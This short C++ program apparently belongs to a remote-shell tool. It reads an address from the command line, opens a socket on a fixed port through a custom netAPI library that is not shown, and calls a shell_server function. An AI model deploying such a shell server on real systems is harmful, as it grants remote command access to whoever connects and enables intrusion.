#import "../libs/netAPI.h"

int main(int argc, char **argv) {
	if (argc < 2) {
		std::cout << "[!]Need a few arguments...";
		exit(GENERAL_ERROR);
	}

	SPtr<net> api;
	sockaddr_in addr;

	api.memory() -> init_socket(&addr, argv[1], STANDART_PORT);
	api.memory() -> shell_server(addr, BUFFER);
}
